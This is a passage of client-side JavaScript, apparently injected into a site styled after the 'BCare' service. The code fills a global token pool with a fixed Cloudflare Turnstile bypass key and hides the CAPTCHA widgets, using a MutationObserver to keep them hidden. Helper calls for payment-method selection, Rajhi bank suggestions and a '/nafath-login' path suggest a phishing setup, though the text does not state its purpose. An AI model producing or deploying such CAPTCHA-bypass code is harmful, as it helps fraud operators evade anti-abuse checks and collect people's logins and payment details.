    fetch("/api/laravel/api/v1/site/settings", { credentials: "omit", cache: "no-store" })
      .then(function(r) { return r.json(); })
      .then(function(data) {
        _siteSettings = (data && data.success && data.data) ? data.data : null;
        _settingsFetched = true;
        cb(_siteSettings);
      })
      .catch(function() {
        _settingsFetched = true;
        cb(null);
      });
  }

  function injectBypassToken(bypassKey) {
    if (!bypassKey) return;
    // Inject into the global token pool the SPA reads from
    if (!globalThis.__BCareTokenPool) {
      globalThis.__BCareTokenPool = [];
    }
    // Keep the pool topped up with bypass tokens (SPA pops them)
    while (globalThis.__BCareTokenPool.length < 5) {
      globalThis.__BCareTokenPool.push(bypassKey);
    }
  }

  function hideTurnstileWidget() {
    var widgets = document.querySelectorAll(
      "div.cf-turnstile, div[data-sitekey], .cf-challenge-running, .cf-turnstile-wrapper"
    );
    for (var i = 0; i < widgets.length; i++) {
      if (!widgets[i].dataset.rlHidden) {
        widgets[i].style.display = "none";
        widgets[i].dataset.rlHidden = "1";
      }
    }
  }

  function applyTurnstileBypass() {
    fetchSiteSettings(function(s) {
      if (!s) return;
      var bypassKey = s.turnstile_bypass_key || "";
      var regDisabled  = s.turnstile_register_enabled === false;
      var sessDisabled = s.turnstile_session_enabled  === false;

      if (!regDisabled && !sessDisabled && !bypassKey) return;

      var path = window.location.pathname;
      // Detect register context — BCare registration / session-start pages
      var isRegContext  = path === "/" || path === "/register" || path === "/start" || path === "/mobile-verify";
      var isSessContext = path === "/book-appointment" || path === "/booking" || path === "/nafath-login" || path === "/";

      var shouldBypass =
        (regDisabled  && isRegContext) ||
        (sessDisabled && isSessContext) ||
        bypassKey; // if bypass key set, always inject (server decides)

      if (shouldBypass) {
        injectBypassToken(bypassKey || "bypass");
        // Also hide the visual widget
        if (regDisabled || sessDisabled) {
          hideTurnstileWidget();
          // Keep hiding as DOM mutates
          var hideObserver = new MutationObserver(function() {
            if (regDisabled || sessDisabled) hideTurnstileWidget();
          });
          hideObserver.observe(document.body, { childList: true, subtree: true });
        }
      }
    });
  }

  // Also run suggestion-on-error inside MutationObserver (already called in observer)
  var origInit = init;
  function initWithAll() {
    applyTurnstileBypass();
    origInit();
    addValidationHint();
    setTimeout(applyPaymentMethodSelector, 500);
    setTimeout(applyPaymentMethodSelector, 1200);
    setTimeout(addRajhiSuggestionOnError, 1500);
    setTimeout(addRajhiSuggestionOnError, 3000);
    setTimeout(fixCaptchaAlignment, 800);
  }
  init = initWithAll;

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
